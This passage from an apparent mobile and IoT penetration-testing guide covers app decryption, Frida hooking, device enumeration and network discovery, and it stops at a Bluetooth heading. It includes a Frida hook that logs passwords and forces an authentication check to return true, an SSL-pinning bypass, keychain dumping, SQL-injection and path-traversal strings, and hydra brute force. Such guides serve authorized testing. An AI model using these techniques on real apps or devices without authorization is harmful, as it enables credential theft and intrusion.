**Automated Signing (apksigner)**:

```bash
# Generate key
keytool -genkey -v -keystore debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000

# Sign with apksigner
apksigner sign --ks debug.keystore --ks-pass pass:android modified.apk

# Verify
apksigner verify modified.apk
```

### Android Debug Bridge (ADB) Advanced Commands

**File Operations**:

```bash
# Push file to device
adb push file.txt /sdcard/

# Pull file from device
adb pull /sdcard/file.txt

# Access app data (requires root or debuggable app)
adb shell "run-as com.example.app ls /data/data/com.example.app"
adb shell "run-as com.example.app cat /data/data/com.example.app/databases/app.db" > app.db
```

**Database Extraction**:

```bash
# Pull SQLite database
adb pull /data/data/com.example.app/databases/user.db

# Analyze database
sqlite3 user.db
.tables
.schema tablename
SELECT * FROM users;
```

**Logcat Monitoring**:

```bash
# View all logs
adb logcat

# Filter by tag
adb logcat -s "MyApp"

# Filter by priority (V=Verbose, D=Debug, I=Info, W=Warning, E=Error)
adb logcat *:E  # Only errors

# Clear logs
adb logcat -c

# Save to file
adb logcat > logcat_output.txt
```

## iOS Application Analysis

iOS applications (IPA files) are ZIP archives containing ARM binaries, resources, and provisioning profiles. Analysis requires understanding of Objective-C/Swift, Mach-O binary format, and iOS security mechanisms.

### IPA Structure and Components

**IPA Contents**:

- `Payload/Application.app/` - Main application bundle
- `Application` - Mach-O executable binary
- `Info.plist` - Application configuration and permissions
- `_CodeSignature/` - Code signing information
- `Assets.car` - Compiled asset catalog
- `Frameworks/` - Embedded frameworks
- `PlugIns/` - App extensions

### IPA Acquisition

**From Device (Jailbroken)**:

```bash
# SSH into device
ssh root@<device_ip>

# Find app bundle
find /var/containers/Bundle/Application -name "*.app"

# Create IPA
cd /var/containers/Bundle/Application/<app-uuid>/
zip -r app.ipa Payload/

# Transfer to computer
scp root@<device_ip>:~/app.ipa .
```

**Using frida-ios-dump** (jailbroken device):

```bash
# Clone tool
git clone https://github.com/AloneMonkey/frida-ios-dump
cd frida-ios-dump

# Install requirements
pip3 install -r requirements.txt

# List installed apps
python3 dump.py -l

# Dump decrypted IPA
python3 dump.py com.example.app
```

**From iTunes Backup** [Unverified: Method effectiveness varies by iOS version]:

```bash
# Create iTunes backup
# Backup location varies by OS

# Extract IPA from backup using tools like iBackup Extractor
```

### IPA Extraction

```bash
# Extract IPA (ZIP archive)
unzip application.ipa -d extracted_ipa/

# Navigate to app bundle
cd extracted_ipa/Payload/Application.app/
```

### Static Analysis Tools

**class-dump - Extract Objective-C Headers**:

```bash
# Extract class headers
class-dump Application > headers.h

# Specify architecture (for fat binaries)
class-dump -arch arm64 Application > headers_arm64.h

# Output to directory
class-dump -H Application -o headers/
```

**Hopper Disassembler**:

```bash
# Commercial tool for macOS/Linux
# Supports ARM64, x86_64 disassembly
# Decompiler for Objective-C and Swift
hopper -e Application
```

**Ghidra - Open-Source Reverse Engineering**:

```bash
# Launch Ghidra
ghidraRun

# Import Mach-O binary
# File â†’ Import File â†’ Select Application binary
# Analyze with ARM64 processor
```

**jtool2 - Mach-O Analysis**:

```bash
# Analyze Mach-O structure
jtool2 -l Application  # List segments and sections
jtool2 -L Application  # List libraries
jtool2 -S Application  # List symbols

# Extract specific architecture from fat binary
jtool2 -arch arm64 -e Application -o Application_arm64
```

### Binary Analysis

**File Type Identification**:

```bash
# Identify binary type
file Application
# Output: Mach-O 64-bit executable arm64

# Check if binary is encrypted
otool -l Application | grep cryptid
# cryptid 1 = encrypted, cryptid 0 = decrypted

# Alternative using jtool2
jtool2 -l Application | grep crypt
```

**Decrypting App Store Binaries**:

App Store apps are encrypted with FairPlay DRM. Decryption requires:

1. **Jailbroken device**
2. **Dumping from memory** (where binary is decrypted at runtime)

**Using Clutch** (jailbroken device):

```bash
# Install Clutch via Cydia or manual installation
# SSH to device

Clutch -i  # List installed apps
Clutch -d com.example.app  # Dump decrypted IPA
```

**Using bfinject** (alternative):

```bash
# More complex but supports newer iOS versions
# Requires manual setup and frida-server
```

### Info.plist Analysis

```bash
# View Info.plist (binary format)
plutil -p Info.plist

# Convert to XML
plutil -convert xml1 Info.plist -o Info_readable.plist

# Extract URL schemes
plutil -p Info.plist | grep -A 5 "CFBundleURLSchemes"

# Check permissions
plutil -p Info.plist | grep "UsageDescription"
```

**Key Info.plist Elements**:

**URL Schemes** (deep linking):

```xml
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>myapp</string>
        </array>
    </dict>
</array>
```

**App Transport Security** (network security):

```xml
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <true/>  <!-- Security risk: allows insecure HTTP -->
</dict>
```

**Permissions**:

```xml
<key>NSCameraUsageDescription</key>
<string>App needs camera access</string>
<key>NSLocationWhenInUseUsageDescription</key>
<string>App needs location</string>
```

### String and Resource Extraction

```bash
# Extract strings from binary
strings Application | grep -i "http\|api\|key\|password\|secret"

# Extract from specific section
otool -s __TEXT __cstring Application

# Search for URLs
strings Application | grep -E "https?://"

# Extract embedded certificates
strings Application | grep -A 10 "BEGIN CERTIFICATE"
```

### Dynamic Analysis Setup

**Jailbreak Requirements**:

- **Unc0ver**, **Taurine**, **Checkra1n** - Popular jailbreak tools
- iOS version compatibility varies

**SSH Access** (after jailbreak):

```bash
# Install OpenSSH via Cydia/Sileo

# Connect to device
ssh root@<device_ip>
# Default password: alpine (CHANGE IMMEDIATELY)

# Change default password
passwd
```

### iOS Runtime Analysis with Frida

**Frida Setup on iOS**:

```bash
# Install Frida on device via Cydia
# Add repository: https://build.frida.re

# Or manual installation
# Download frida-server for iOS from GitHub
# Copy to device: scp frida-server root@<device_ip>:/usr/sbin/
ssh root@<device_ip>
chmod +x /usr/sbin/frida-server
frida-server &

# Verify from host
frida-ps -U
```

**iOS Frida Hooking**:

**Objective-C Method Hooking**:

```javascript
// hook_ios.js
if (ObjC.available) {
    var className = "ViewController";
    var methodName = "- checkPassword:";
    
    var hook = ObjC.classes[className][methodName];
    
    Interceptor.attach(hook.implementation, {
        onEnter: function(args) {
            var password = ObjC.Object(args[2]);
            console.log("Password: " + password.toString());
        },
        onLeave: function(retval) {
            console.log("Original return: " + retval);
            retval.replace(ptr(1));  // Force return true
        }
    });
}
```

**Swift Method Hooking**:

```javascript
// Swift name mangling - use Frida-Trace or find mangled name
var moduleName = "Application";
var className = "ViewController";
var methodName = "checkPassword";

// Find mangled symbol
var symbols = Module.enumerateSymbolsSync(moduleName);
symbols.forEach(function(symbol) {
    if (symbol.name.indexOf(methodName) !== -1) {
        console.log("Found: " + symbol.name);
        
        Interceptor.attach(symbol.address, {
            onEnter: function(args) {
                console.log("Method called");
            }
        });
    }
});
```

**SSL Pinning Bypass (iOS)**:

```javascript
// Hook SSL validation
if (ObjC.available) {
    var NSURLSession = ObjC.classes.NSURLSession;
    var URLSession_didReceiveChallenge = 
        NSURLSession['- URLSession:didReceiveChallenge:completionHandler:'];
    
    Interceptor.attach(URLSession_didReceiveChallenge.implementation, {
        onEnter: function(args) {
            var completionHandler = new ObjC.Block(args[4]);
            var originalImpl = completionHandler.implementation;
            
            completionHandler.implementation = function(disposition, credential) {
                // NSURLSessionAuthChallengeUseCredential = 0
                originalImpl(0, credential);
            };
        }
    });
}
```

### objection on iOS

```bash
# Launch objection
objection -g com.example.app explore

# iOS-specific commands
ios hooking list classes
ios hooking search classes ViewController
ios hooking watch class ViewController
ios sslpinning disable
ios jailbreak disable  # Bypass jailbreak detection
ios nsurlcredentialstorage dump
ios cookies get
ios keychain dump
```

### iOS Network Analysis

**Proxy Configuration**:

```bash
# Install Burp CA certificate
# Email cert to device, install via Settings

# Configure WiFi proxy
# Settings â†’ WiFi â†’ (i) â†’ Configure Proxy â†’ Manual
# Server: <burp_ip>, Port: 8080
```

**Charles Proxy** (alternative to Burp for iOS):

```bash
# Better SSL pinning bypass support for iOS
# Help â†’ SSL Proxying â†’ Install Charles Root Certificate on Mobile Device
```

### Keychain Analysis

**Access Keychain (requires jailbreak)**:

```bash
# Keychain location
/var/Keychains/keychain-2.db

# Pull keychain database
scp root@<device_ip>:/var/Keychains/keychain-2.db .

# Analyze with keychain_dumper (on device)
./keychain_dumper

# Or use objection
objection -g com.example.app explore
ios keychain dump
```

**Keychain Structure**:

```sql
-- SQLite database containing encrypted items
-- Keys protected by device passcode and hardware encryption
```

[Inference: Keychain extraction effectiveness depends on device encryption state and iOS version]

### iOS File System Analysis

**Application Sandbox**:

```bash
# App data location (UUID varies)
/var/mobile/Containers/Data/Application/<UUID>/

# Documents directory
/var/mobile/Containers/Data/Application/<UUID>/Documents/

# Library directory (preferences, caches)
/var/mobile/Containers/Data/Application/<UUID>/Library/

# Preferences plist
/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/com.example.app.plist
```

**Extract App Data**:

```bash
# Find app UUID
ssh root@<device_ip>
find /var/mobile/Containers/Data/Application -name "com.example.app*"

# Pull entire app data
scp -r root@<device_ip>:/var/mobile/Containers/Data/Application/<UUID>/ ./app_data/
```

### Repackaging and Resigning iOS Apps

**Code Signing**:

```bash
# Check current signature
codesign -dvvv Application.app

# Remove existing signature
rm -rf Application.app/_CodeSignature

# Resign with new certificate
codesign -f -s "iPhone Developer: Name (ID)" Application.app

# Create IPA
zip -r resigned.ipa Payload/
```

**iOS App Signer** (GUI tool for macOS):

- Simplifies resigning process
- Handles provisioning profiles
- Useful for sideloading

### Sideloading Apps

**Cydia Impactor** [Unverified: May not work with latest iOS versions]:

```bash
# Drag IPA to Cydia Impactor
# Sign with Apple ID
# Install on device
```

**ios-deploy**:

```bash
# Install via npm
npm install -g ios-deploy

# Deploy to connected device
ios-deploy --bundle Application.app
```

**Xcode**:

```bash
# Import app bundle into Xcode
# Sign with development certificate
# Build and run on device
```

## Mobile Device Enumeration

Device enumeration identifies hardware, software, configuration, and security posture of mobile devices.

### Android Device Enumeration

**Basic Device Information**:

```bash
# Device model and Android version
adb shell getprop ro.product.model
adb shell getprop ro.build.version.release

# All properties
adb shell getprop

# Kernel version
adb shell cat /proc/version

# CPU information
adb shell cat /proc/cpuinfo

# Memory information
adb shell cat /proc/meminfo

# Device uptime
adb shell uptime
```

**Security Status**:

```bash
# Check for root
adb shell "su -c 'id'"

# Root detection methods
adb shell "ls /system/app/Superuser.apk"
adb shell "ls /system/xbin/su"
adb shell "which su"

# SELinux status
adb shell getenforce

# Encryption status
adb shell getprop ro.crypto.state
```

**Installed Applications**:

```bash
# List all packages
adb shell pm list packages

# List system packages
adb shell pm list packages -s

# List third-party packages
adb shell pm list packages -3

# List enabled packages
adb shell pm list packages -e

# Package details
adb shell dumpsys package com.example.app

# App installation dates
adb shell pm list packages -f | while read line; do
    pkg=$(echo $line | cut -d'=' -f2)
    adb shell stat /data/app/$pkg* 2>/dev/null | grep Modify
done
```

**Network Configuration**:

```bash
# IP configuration
adb shell ip addr

# WiFi status
adb shell dumpsys wifi

# Network connections
adb shell netstat -an

# Listening ports
adb shell netstat -ln
```

**Running Processes**:

```bash
# Process list
adb shell ps

# Detailed process information
adb shell ps -A -o NAME,PID,PPID,USER

# Top processes
adb shell top -n 1
```

**File System Enumeration**:

```bash
# Mount points
adb shell mount

# Disk usage
adb shell df -h

# SD card contents
adb shell ls -laR /sdcard/

# System directories (requires root)
adb shell "su -c 'ls -laR /data/data/'"
```

**Backup Capabilities**:

```bash
# Create full backup
adb backup -all -f backup.ab

# Backup specific app
adb backup -f app_backup.ab com.example.app

# Restore backup
adb restore backup.ab
```

### iOS Device Enumeration

**Basic Device Information** (jailbroken):

```bash
# SSH into device
ssh root@<device_ip>

# iOS version
sw_vers

# Device model
uname -m

# Kernel version
uname -a

# Uptime
uptime

# Device info via ideviceinfo (from computer)
ideviceinfo
ideviceinfo -k ProductType
ideviceinfo -k ProductVersion
```

**Installed Applications** (jailbroken):

```bash
# List installed apps
ls -la /var/mobile/Containers/Bundle/Application/

# App bundles
find /var/mobile/Containers/Bundle/Application -name "*.app"

# Get bundle identifiers
find /var/mobile/Containers/Bundle/Application -name "*.app" -exec plutil -p {}/Info.plist \; | grep CFBundleIdentifier
```

**Non-Jailbroken Enumeration** (via idevice tools):

```bash
# Install libimobiledevice
# macOS: brew install libimobiledevice
# Linux: apt install libimobiledevice-utils

# Device information
ideviceinfo

# Installed apps
ideviceinstaller -l

# Syslog monitoring
idevicesyslog

# File access (limited)
ifuse /mnt/iphone
```

**Network Configuration** (jailbroken):

```bash
# IP configuration
ifconfig

# Network connections
netstat -an

# Routing table
netstat -rn

# DNS configuration
cat /etc/resolv.conf
```

**Security Status** (jailbroken):

```bash
# Check jailbreak indicators
ls /Applications/Cydia.app
ls /bin/bash
ls /private/var/lib/apt/

# Installed tweaks
ls /Library/MobileSubstrate/DynamicLibraries/
```

**File System** (jailbroken):

```bash
# Application sandboxes
ls /var/mobile/Containers/Data/Application/

# Shared resources
ls /var/mobile/Library/

# System files
ls /System/Library/
```

### Cross-Platform Mobile Enumeration

**Drozer - Android Security Assessment Framework**:

```bash
# Install Drozer
pip install drozer

# Install agent APK on device
adb install drozer-agent.apk

# Connect to device drozer console connect

# Enumerate attack surface
run app.package.attacksurface com.example.app

# List activities
run app.activity.info -a com.example.app

# List services
run app.service.info -a com.example.app

# List broadcast receivers
run app.broadcast.info -a com.example.app

# List content providers
run app.provider.info -a com.example.app

# Test exported components
run app.activity.start --component com.example.app com.example.app.VulnerableActivity

# Query content provider
run app.provider.query content://com.example.app.provider/users

# SQL injection testing
run scanner.provider.injection -a com.example.app

# Path traversal testing
run scanner.provider.traversal -a com.example.app
````

**MobSF - Mobile Security Framework**:
```bash
# Install via Docker
docker pull opensecurity/mobile-security-framework-mobsf
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# Access web interface
# http://localhost:8000

# Upload APK/IPA for automated analysis
# Provides: Static analysis, permissions, code quality, vulnerabilities
````

**Needle - iOS Security Testing Framework** [Unverified: Project may no longer be actively maintained]:

```bash
# Requires jailbroken iOS device
pip install needle

# Launch Needle
needle

# Connect to device
[needle] > use device/connect
[needle][connect] > set IP <device_ip>
[needle][connect] > run

# Enumerate installed apps
[needle] > use binary/info/metadata
[needle][metadata] > run

# Analyze app binary
[needle] > use binary/reversing/class_dump
[needle][class_dump] > set BUNDLE_ID com.example.app
[needle][class_dump] > run
```

### Remote Access and Debugging

**Android Remote Debugging**:

```bash
# Enable TCP/IP mode
adb tcpip 5555

# Connect remotely
adb connect <device_ip>:5555

# Verify connection
adb devices

# Disconnect
adb disconnect

# Return to USB mode
adb usb
```

**iOS Remote Access** (jailbroken):

```bash
# SSH over USB (using iproxy)
iproxy 2222 22

# Connect via localhost
ssh -p 2222 root@localhost

# SCP over USB tunnel
scp -P 2222 file.txt root@localhost:/tmp/
```

### Battery and Performance Enumeration

**Android Battery Stats**:

```bash
# Battery information
adb shell dumpsys battery

# Battery statistics
adb shell dumpsys batterystats

# Wakelock information
adb shell dumpsys batterystats | grep -i wakelock

# CPU usage by app
adb shell dumpsys cpuinfo
```

**iOS Battery Information** (jailbroken):

```bash
# Battery level
ioreg -l | grep Capacity

# Power management
pmset -g
```

### Sensor and Hardware Enumeration

**Android Sensors**:

```bash
# List available sensors
adb shell dumpsys sensorservice

# Sensor details
adb shell "content query --uri content://settings/system --projection name:value" | grep sensor
```

**Camera and Media**:

```bash
# Camera information
adb shell dumpsys media.camera

# Audio devices
adb shell dumpsys audio

# Display information
adb shell dumpsys display
```

### Certificate and Trust Store Enumeration

**Android Certificates**:

```bash
# System certificates
adb shell ls /system/etc/security/cacerts/

# User certificates
adb shell ls /data/misc/user/0/cacerts-added/

# Extract certificate
adb pull /system/etc/security/cacerts/<cert_hash>.0

# View certificate
openssl x509 -in <cert_hash>.0 -inform DER -text
```

**iOS Certificates** (jailbroken):

```bash
# System trust store
ls /System/Library/Frameworks/Security.framework/

# User trust store
ls /var/Keychains/TrustStore.sqlite3

# Dump trust store
sqlite3 /var/Keychains/TrustStore.sqlite3 "SELECT * FROM tsettings;"
```

### Vulnerability Scanning

**Android Vulnerability Detection**:

```bash
# Check for known vulnerable versions
adb shell getprop ro.build.version.security_patch

# Stagefright vulnerability check
adb shell dumpsys media.player | grep -i stagefright

# Check for exposed services
adb shell service list

# WebView version (vulnerable if outdated)
adb shell dumpsys webviewupdate
```

**Qark - Quick Android Review Kit**:

```bash
# Install Qark
pip install qark

# Scan APK
qark --apk application.apk

# Generate report
qark --apk application.apk --report-type html
```

**AndroGuard - Python APK Analysis**:

```bash
# Install
pip install androguard

# Analyze APK
androlyze -s
>>> a, d, dx = AnalyzeAPK("application.apk")

# Get activities
>>> a.get_activities()

# Get permissions
>>> a.get_permissions()

# Find specific API calls
>>> dx.find_methods(".", "getDeviceId")

# Detect crypto misuse
>>> for m in dx.find_methods(".", "DES"):
...     print(m)
```

### Device Fingerprinting

**Android Device Identifiers**:

```bash
# IMEI (requires permission)
adb shell service call iphonesubinfo 1

# Android ID
adb shell settings get secure android_id

# Serial number
adb shell getprop ro.serialno

# WiFi MAC address
adb shell cat /sys/class/net/wlan0/address

# Bluetooth MAC
adb shell settings get secure bluetooth_address
```

**iOS Device Identifiers** (jailbroken):

```bash
# UDID
idevice_id -l

# Serial number
ideviceinfo -k SerialNumber

# IMEI
ideviceinfo -k InternationalMobileEquipmentIdentity

# WiFi MAC
ifconfig en0 | grep ether
```

### Backup Analysis

**Android Backup Extraction**:

```bash
# Create backup
adb backup -f backup.ab com.example.app

# Convert AB to TAR (using abe tool)
java -jar abe.jar unpack backup.ab backup.tar

# Extract TAR
tar -xvf backup.tar

# Alternative: using dd (for unencrypted backups)
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
```

**iOS Backup Analysis**:

```bash
# Create iTunes backup
# iTunes â†’ Device â†’ Back Up Now

# Backup locations:
# macOS: ~/Library/Application Support/MobileSync/Backup/
# Windows: %APPDATA%\Apple Computer\MobileSync\Backup\

# Analyze with iBackup Viewer or similar tools

# Extract specific files using plist
# Manifest.db contains file index
sqlite3 Manifest.db "SELECT * FROM Files WHERE relativePath LIKE '%com.example.app%';"

# Decrypt encrypted backups (requires backup password)
# Use tools like iphone-backup-decrypt
```

### Logcat Analysis for Sensitive Data

**Android Log Monitoring**:

```bash
# Monitor all logs
adb logcat

# Filter by application PID
adb logcat --pid=$(adb shell pidof -s com.example.app)

# Search for sensitive data patterns
adb logcat | grep -iE "(password|token|api_key|secret|credit|ssn)"

# Filter by tag
adb logcat -s "MyApp:*"

# Save to file with timestamp
adb logcat -v time > logcat_$(date +%Y%m%d_%H%M%S).txt

# Monitor specific buffer
adb logcat -b system
adb logcat -b crash
```

**Common Logcat Vulnerabilities**:

```java
// Insecure logging examples to search for in decompiled code
Log.d("MyApp", "User password: " + password);
Log.i("API", "Auth token: " + authToken);
System.out.println("Credit card: " + ccNumber);
```

### Inter-Process Communication (IPC) Enumeration

**Android Intents**:

```bash
# Send broadcast intent
adb shell am broadcast -a com.example.app.ACTION_CUSTOM

# Start activity with data
adb shell am start -n com.example.app/.MainActivity -d "content://data"

# Start activity with extras
adb shell am start -n com.example.app/.MainActivity --es "key" "value" --ei "count" 5

# Send to service
adb shell am startservice -n com.example.app/.MyService

# Monitor broadcasts
adb shell "dumpsys activity broadcasts | grep -A 10 com.example.app"
```

**Drozer Intent Fuzzing**:

```bash
# List exported activities
run app.activity.info -a com.example.app -i

# Send null intent
run app.activity.start --component com.example.app com.example.app.Activity

# Fuzz with various data types
run app.activity.start --component com.example.app com.example.app.Activity --extra string key "../../sensitive/file"
```

**Content Provider Exploitation**:

```bash
# Query content provider
adb shell content query --uri content://com.example.app.provider/users

# Insert data
adb shell content insert --uri content://com.example.app.provider/users --bind name:s:hacker

# Update data
adb shell content update --uri content://com.example.app.provider/users --where "id=1" --bind name:s:modified

# Delete data
adb shell content delete --uri content://com.example.app.provider/users --where "id=1"

# SQL injection test
adb shell content query --uri "content://com.example.app.provider/users" --where "name='admin' OR '1'='1"

# Path traversal test
adb shell content query --uri "content://com.example.app.provider/../../../etc/passwd"
```

### iOS URL Scheme Enumeration

**Test URL Schemes**:

```bash
# Open URL scheme via Safari
# On device: safari://

# Test custom scheme
idevicedebug run com.example.app -- myapp://action?param=value

# Using objection
ios ui open myapp://sensitive/data

# Frida script to intercept URL handling
```

```javascript
// Intercept URL scheme handling
if (ObjC.available) {
    var AppDelegate = ObjC.classes.AppDelegate;
    var openURL = AppDelegate['- application:openURL:options:'];
    
    Interceptor.attach(openURL.implementation, {
        onEnter: function(args) {
            var url = new ObjC.Object(args[3]);
            console.log("URL opened: " + url.absoluteString());
        }
    });
}
```

### IoT Device Enumeration

IoT devices often share similarities with mobile platforms but have unique enumeration challenges.

**Network Discovery**:

```bash
# Discover IoT devices on network
nmap -sn 192.168.1.0/24

# Identify IoT devices by MAC OUI
nmap -sn 192.168.1.0/24 | grep -B 2 "MAC Address"

# Scan common IoT ports
nmap -p 80,443,8080,8443,23,22,21,1883,5683,8883 192.168.1.0/24

# MQTT discovery (IoT messaging protocol)
nmap -p 1883 --script mqtt-subscribe -Pn <target_ip>

# CoAP discovery (Constrained Application Protocol)
nmap -sU -p 5683 --script coap-resources <target_ip>
```

**MQTT Enumeration**:

```bash
# Install mosquitto client
apt install mosquitto-clients

# Subscribe to all topics (anonymous)
mosquitto_sub -h <broker_ip> -t '#' -v

# Subscribe with authentication
mosquitto_sub -h <broker_ip> -t '#' -u username -P password

# Publish message
mosquitto_pub -h <broker_ip> -t 'test/topic' -m 'payload'

# Brute force authentication
hydra -L users.txt -P passwords.txt mqtt://<broker_ip>
```

**UPnP/SSDP Discovery**:

```bash
# Discover UPnP devices
nmap -sU -p 1900 --script upnp-info 192.168.1.0/24

# SSDP discovery
echo -ne "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n" | nc -u 239.255.255.250 1900

# Parse responses for device information
```

**Bluetooth LE Enumeration**:

```bash
# Scan for BLE devices
hcitool lescan

# Connect to device
gatttool -b <MAC_ADDRESS> -I
> connect
> characteristics

# Read characteristic
> char-read-hnd 0x000e

# Write to characteristic
> char-write-req 0x000e 0100

# Advanced BLE analysis with bettercap
sudo bettercap
ble.recon on
ble.show
```

**Zigbee/Z-Wave Analysis**:

```bash
# Requires specialized hardware (e.g., Zigbee sniffer)

# Wireshark with Zigbee plugin
wireshark -i <zigbee_interface>

# Analyze Zigbee traffic
# Filter: zbee
```

**Firmware Extraction**:

```bash
# UART/Serial connection
screen /dev/ttyUSB0 115200

# Minicom
minicom -D /dev/ttyUSB0 -b 115200

# Identify bootloader (U-Boot common)
# Interrupt boot process to access console

# Dump firmware via JTAG (requires OpenOCD)
openocd -f interface/ftdi/jtagkey.cfg -f target/chip.cfg
> dump_image firmware.bin 0x00000000 0x1000000
```

**Binwalk for Firmware Analysis**:

```bash
# Analyze firmware structure
binwalk firmware.bin

# Extract filesystem
binwalk -e firmware.bin

# Entropy analysis (detect encryption)
binwalk -E firmware.bin

# Search for signatures
binwalk -A firmware.bin  # CPU architecture
binwalk --strings firmware.bin
```

---

## Integrated Mobile & IoT Assessment Workflow

### Reconnaissance Phase

1. **Device identification**: Determine platform (Android/iOS/IoT)
2. **Version detection**: OS version, patch level, security features
3. **Network mapping**: Services, open ports, network topology
4. **App/firmware acquisition**: Extract APK/IPA/firmware images

### Static Analysis Phase

1. **Decompilation**: jadx, class-dump, Ghidra
2. **Manifest/plist analysis**: Permissions, exported components, configurations
3. **Code review**: Hardcoded credentials, crypto misuse, logic flaws
4. **Binary analysis**: Encryption status, obfuscation, anti-debugging

### Dynamic Analysis Phase

1. **Runtime hooking**: Frida for behavior modification
2. **Network interception**: Burp/Charles for traffic analysis
3. **IPC testing**: Intent fuzzing, URL scheme exploitation
4. **Debugger attachment**: GDB for native debugging

### Vulnerability Identification

1. **Insecure data storage**: Keychain, SharedPreferences, databases
2. **Weak crypto**: Hardcoded keys, weak algorithms
3. **Authentication flaws**: Token handling, session management
4. **Authorization bypass**: Exported components, privilege escalation
5. **Injection vulnerabilities**: SQL, command, XSS in WebViews

### Exploitation Phase

1. **Privilege escalation**: Root/jailbreak detection bypass
2. **Data exfiltration**: Sensitive information extraction
3. **Runtime manipulation**: Method hooking, return value modification
4. **Persistence**: Backdoor installation (for authorized assessments)

**Key Enumeration Priorities**:

- Exported components (Android)
- URL schemes (iOS)
- Insecure data storage locations
- Network communications
- Authentication mechanisms
- Third-party library vulnerabilities

---

## IoT Device Discovery

IoT device discovery identifies connected devices on networks, including smart home devices, industrial sensors, cameras, and embedded systems.

### Network Scanning for IoT Devices

**Nmap IoT Discovery**

```bash
# Basic network sweep
nmap -sn 192.168.1.0/24

# Service detection on common IoT ports
nmap -p 80,443,8080,8443,22,23,21,445,1883,8883,5683 192.168.1.0/24

# Aggressive IoT scan with service detection
nmap -sV -O -p- --script=banner,http-title 192.168.1.0/24

# Common IoT ports scan
nmap -p 21,22,23,80,81,443,445,554,1883,5000,5001,8080,8081,8443,8554,9000 -sV 192.168.1.0/24

# UPnP discovery
nmap -sU -p 1900 --script=upnp-info 192.168.1.0/24

# RTSP (cameras) discovery
nmap -p 554,8554 --script rtsp-methods 192.168.1.0/24

# Identify devices by OS fingerprinting
nmap -O 192.168.1.0/24

# Script scan for device identification
nmap -sV --script=http-title,banner,ssl-cert,ssh-hostkey 192.168.1.0/24
```

**Nmap Scripts for IoT**

```bash
# MQTT discovery
nmap -p 1883 --script mqtt-subscribe 192.168.1.0/24

# CoAP discovery
nmap -sU -p 5683 --script coap-resources 192.168.1.0/24

# SNMP enumeration (common in IoT)
nmap -sU -p 161 --script snmp-info,snmp-interfaces 192.168.1.0/24

# BACnet discovery (building automation)
nmap -sU -p 47808 --script bacnet-info 192.168.1.0/24

# Modbus discovery (industrial IoT)
nmap -p 502 --script modbus-discover 192.168.1.0/24
```

### Specialized IoT Discovery Tools

**arp-scan**

```bash
# Install arp-scan
apt install arp-scan

# Scan local network
arp-scan -l

# Scan specific subnet
arp-scan 192.168.1.0/24

# Identify vendors by MAC address
arp-scan -l | grep -i "raspberry\|espressif\|shenzhen\|tp-link\|xiaomi"

# Verbose output
arp-scan -l -v

# Custom interface
arp-scan -I eth0 192.168.1.0/24
```

**Shodan CLI (Internet-Wide IoT Discovery)**

```bash
# Install Shodan CLI
pip install shodan

# Initialize with API key
shodan init YOUR_API_KEY

# Search for specific IoT devices
shodan search "port:1883 mqtt"
shodan search "port:554 rtsp"
shodan search "http.title:\"IP Camera\""
shodan search "port:23 telnet"

# Search by organization
shodan search "org:\"Your Target Org\""

# Search by country
shodan search "country:US port:1883"

# Download search results
shodan download results.json.gz "port:1883"

# Parse downloaded data
shodan parse results.json.gz --fields ip_str,port,org

# Get host information
shodan host 192.168.1.100

# Search for vulnerable devices
shodan search "port:23 default password"
shodan search "http.title:\"DVR\" country:US"
```

**Censys CLI**

```bash
# Install Censys CLI
pip install censys

# Configure API credentials
censys config

# Search for IoT devices
censys search "services.port:1883"
censys search "services.port:554 AND services.banner:rtsp"

# Search by certificate
censys search "parsed.names:iot.company.com"

# View host details
censys view 192.168.1.100
```

**IoTSeeker**

```bash
# Download IoTSeeker
git clone https://github.com/rapid7/IoTSeeker.git
cd IoTSeeker

# Scan for default credentials
python IoTSeeker.py 192.168.1.0/24

# Scan specific device types
python IoTSeeker.py -t cameras 192.168.1.0/24
python IoTSeeker.py -t routers 192.168.1.0/24
```

### Protocol-Specific Discovery

**mDNS/Bonjour Discovery**

```bash
# Install avahi-utils
apt install avahi-utils

# Browse mDNS services
avahi-browse -a

# Resolve mDNS names
avahi-resolve -n device.local

# Browse specific service types
avahi-browse -t _http._tcp
avahi-browse -t _mqtt._tcp
avahi-browse -t _ipp._tcp

# DNS-SD service discovery
dns-sd -B _services._dns-sd._udp
```

**SSDP/UPnP Discovery**

```bash
# Using Nmap
nmap -sU -p 1900 --script=upnp-info 192.168.1.0/24

# Manual SSDP discovery
echo -ne "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n" | nc -u 239.255.255.250 1900

# Using miranda (UPnP tool)
git clone https://github.com/0x90/miranda-upnp.git
cd miranda-upnp
python miranda.py

# Commands in miranda
msearch
host list
host details 0
```

**Python SSDP Discovery Script**

```python
#!/usr/bin/env python3
import socket
import sys

def discover_ssdp():
    """Discover UPnP/SSDP devices"""
    
    msg = b'M-SEARCH * HTTP/1.1\r\n' \
          b'HOST: 239.255.255.250:1900\r\n' \
          b'MAN: "ssdp:discover"\r\n' \
          b'MX: 2\r\n' \
          b'ST: ssdp:all\r\n\r\n'
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    sock.sendto(msg, ('239.255.255.250', 1900))
    
    devices = []
    
    try:
        while True:
            data, addr = sock.recvfrom(65507)
            response = data.decode('utf-8', errors='ignore')
            
            if addr[0] not in [d['ip'] for d in devices]:
                device_info = {'ip': addr[0], 'response': response}
                
                # Parse location
                for line in response.split('\r\n'):
                    if line.startswith('LOCATION:'):
                        device_info['location'] = line.split(':', 1)[1].strip()
                    elif line.startswith('SERVER:'):
                        device_info['server'] = line.split(':', 1)[1].strip()
                
                devices.append(device_info)
                print(f"\nDevice found: {addr[0]}")
                print(f"Server: {device_info.get('server', 'Unknown')}")
                print(f"Location: {device_info.get('location', 'Unknown')}")
    
    except socket.timeout:
        pass
    
    sock.close()
    return devices

if __name__ == "__main__":
    print("Discovering UPnP/SSDP devices...")
    devices = discover_ssdp()
    print(f"\n\nTotal devices found: {len(devices)}")
```

**Bluetooth Discovery**

```bash
